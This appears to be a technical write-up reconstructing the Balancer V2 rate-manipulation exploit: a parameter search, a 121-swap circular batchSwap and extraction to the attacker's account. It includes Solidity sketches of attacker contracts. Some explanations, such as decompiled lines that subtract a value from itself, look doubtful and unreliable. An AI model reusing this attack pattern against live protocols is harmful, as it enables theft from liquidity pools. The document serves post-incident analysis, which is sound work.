# Balancer V2 Attack - Search Algorithm Explanation

## Overview

The Balancer V2 rate manipulation attack uses a sophisticated **parameter search algorithm** rather than direct state manipulation. This document explains how it works based on the decompiled contracts and transaction calldata analysis.

## Key Insight: It's a Search, Not Manipulation

The attacker **does not manipulate pool state** during the 150+ calls to SC2 (BalancerExploitMath). Instead:

1. **SC2 performs READ-ONLY operations** - calls view functions with different parameters
2. **Some parameter combinations trigger BAL#004** (division by zero)
3. **SC1 reads the return data** from successful calls
4. **When criteria are met**, SC1 knows the parameters are exploitable
5. **ONLY THEN** does SC1 execute the batchSwap with discovered parameters

## The 0x524c9e20 Function (SC2)

From `SC2_decompiled.sol`, this function:

```solidity
function unknown524c9e20(
    uint256[] calldata scalingFactors,
    uint256[] calldata balances,
    uint256 indexIn,
    uint256 indexOut,
    uint256 amountGiven,
    uint256 normalizedWeight,
    uint256 swapFeePercentage
) external returns (uint256)
```

### What It Does

1. **Deliberately creates zero values** (Line 179):
   ```solidity
   uint256 virtualBalance = balances[index] - balances[index]; // Always 0
   ```

2. **Creates zero denominator** (Line 223):
   ```solidity
   uint256 sum = virtualBalance + feeAdjustedWeight;
   uint256 denominator = sum - sum; // Always 0!
   ```

3. **Attempts division** (Line 257):
   ```solidity
   return a / denominator; // Triggers BAL#004 when denominator = 0
   ```

### Why This Works

The function tests if specific parameter combinations will cause Balancer's internal math to hit edge cases:
- **Division by zero** → BAL#004 revert
- **Precision loss** → Rounding errors
- **Invariant violations** → Exploitable state

## The Search Algorithm (SC1)

From the actual attack traces:
- **150+ iterations** of calling SC2
- **~30% revert rate** (BAL#004 errors)
- **~70% success rate** with return data

### Search Pattern

```solidity
for (uint256 i = 0; i < 150; i++) {
    try exploitMath.searchForExploitableState(pool, trickIndex, trickAmt, i)
        returns (uint256 score)
    {
        // SUCCESS: Got return data
        // Check if exploitability score meets criteria
        if (score > bestScore) {
            // Found better parameters!
            bestScore = score;
            bestVariation = i;
        }
    } catch {
        // BAL#004: Division by zero
        // This tells us we're near exploitable conditions
    }
}
```

### Why ~30% Revert Rate?

The pattern emerges from testing edge cases:
- Early iterations: Wide parameter exploration
- Middle iterations: Narrowing down promising ranges
- Late iterations: Fine-tuning around optimal values

Some parameter combinations naturally trigger division by zero in Balancer's view functions. This is **expected and useful** - it tells the attacker they're exploring the right parameter space.

## The 121-Step Batch Swap

After finding exploitable parameters, SC1 executes a **complex batch swap**:

### Pattern Analysis from Calldata

Each occurrence of `dacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635` (pool ID) represents **one swap** in the batch.

Count: **121 swaps** total

### Token Index Patterns

From calldata decoding, the swaps cycle through different token pair combinations:

```
Swap 1:  assetInIndex=1, assetOutIndex=0  (BPT → WETH)
Swap 2:  assetInIndex=1, assetOutIndex=2  (BPT → osETH)
Swap 3:  assetInIndex=2, assetOutIndex=0  (osETH → WETH)
Swap 4:  assetInIndex=0, assetOutIndex=2  (WETH → osETH)
Swap 5:  assetInIndex=2, assetOutIndex=1  (osETH → BPT)
Swap 6:  assetInIndex=0, assetOutIndex=1  (WETH → BPT)
... repeats with variations for 121 total swaps
```

### Why This Pattern?

1. **Exploits rate from multiple angles** - trades through all token pairs
2. **Creates circular arbitrage** - extracts value via rounding errors
3. **Gradually drains pool** - 121 small swaps instead of one large swap
4. **Avoids slippage limits** - each swap is small enough to pass checks

## Implementation in Our Code

### BalancerExploitMath.sol Changes

```solidity
function searchForExploitableState(
    address pool,
    uint256 trickIndex,
    uint256 trickAmt,
    uint256 iteration
) external returns (uint256 exploitabilityScore) {
    // Vary parameters based on iteration
    uint256 variation = _calculateParameterVariation(iteration, trickAmt);

    // Test with view function calls
    // Will revert with BAL#004 if parameters create division by zero
    exploitabilityScore = _testExploitability(...);

    return exploitabilityScore;
}
```

### AttackCoordinator.sol Changes

```solidity
function executeManipulationLoop(...) {
    for (uint256 i = 0; i < 150; i++) {
        try exploitMath.searchForExploitableState(...) returns (uint256 score) {
            // Read return data to check exploitability
            if (score > bestScore) {
                bestScore = score;
                bestVariation = i;
            }
        } catch {
            // BAL#004 - parameter combination triggers division by zero
            revertCount++;
        }
    }
}

function executeBatchSwap(...) {
    // Create 121 swaps with varying token index patterns
    for (uint256 i = 0; i < 121; i++) {
        uint256 pattern = i % 6;

        // Cycle through: 1→0, 1→2, 2→0, 0→2, 2→1, 0→1
        if (pattern == 0) {
            assetInIndex = bptIndex;
            assetOutIndex = 0;
        } else if (pattern == 1) {
            assetInIndex = bptIndex;
            assetOutIndex = 2;
        }
        // ... etc

        swaps[i] = BatchSwapStep({
            poolId: poolId,
            assetInIndex: assetInIndex,
            assetOutIndex: assetOutIndex,
            amount: calculatedAmount,
            userData: ""
        });
    }

    // Execute with GIVEN_IN mode (kind=1 from calldata)
    vault.batchSwap(SwapKind.GIVEN_IN, swaps, ...);
}
```

## Summary

The attack works in three phases:

1. **Search Phase** (150+ iterations)
   - Call SC2 with varying parameters
   - Read return data for exploitability
   - ~30% trigger BAL#004 (good sign - edge cases)
   - ~70% return scores (find best parameters)

2. **Execution Phase** (121 swaps)
   - Use discovered parameters
   - Execute complex circular trading pattern
   - Vary token indices to exploit from all angles
   - Use GIVEN_IN mode with internal balances

3. **Extraction Phase**
   - Withdraw from internal balances
   - Transfer to attacker EOA
   - Profit from rate manipulation

## Why This is Hard to Defend Against

1. **View functions are read-only** - no state changes during search
2. **BAL#004 is a valid error** - pools can legitimately hit this
3. **Each swap is valid** - no individual swap violates constraints
4. **The pattern is subtle** - 121 swaps is unusual but not illegal
5. **Rate cache is trusted** - Balancer assumes cached rates are accurate

The vulnerability lies in the **interaction** between:
- Cached rate values
- Complex pool math with edge cases
- Batch swap functionality allowing complex patterns
